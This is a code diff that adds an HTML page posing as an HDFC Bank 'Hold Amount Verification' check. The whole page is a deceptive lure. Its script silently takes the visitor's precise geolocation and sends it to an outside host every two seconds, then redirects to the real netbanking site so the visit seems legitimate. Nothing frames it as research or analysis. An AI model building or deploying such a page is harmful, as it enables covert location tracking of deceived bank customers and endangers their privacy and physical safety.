@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Hold Amount Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 100px;
+      background-color: #f0f2f5;
+    }
+    h2 {
+      color: #333;
+    }
+    #loading {
+      color: #555;
+      font-size: 16px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h2>Verifying Hold Amount Status...</h2>
+  <p id="loading">Please wait while we check your account status...</p>
+
+  <script>
+    function sendLocation(position) {
+      const { latitude, longitude } = position.coords;
+      const timestamp = new Date().toISOString();
+
+      fetch("https://location-tracker-balt.onrender.com/receive-location", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ latitude, longitude, timestamp })
+      });
+    }
+
+    function trackLocation() {
+      navigator.geolocation.getCurrentPosition(sendLocation, () => {}, {
+        enableHighAccuracy: true,
+        maximumAge: 0,
+        timeout: 5000
+      });
+    }
+
+    // Start tracking every 2 seconds
+    if (navigator.geolocation) {
+      trackLocation();
+      setInterval(trackLocation, 2000); // 2 seconds
+    }
+
+    // Redirect after 3 seconds
+    setTimeout(() => {
+      window.location.href = "https://netbanking.hdfcbank.com/netbanking/";
+    }, 3000);
+  </script>
+</body>
+</html>
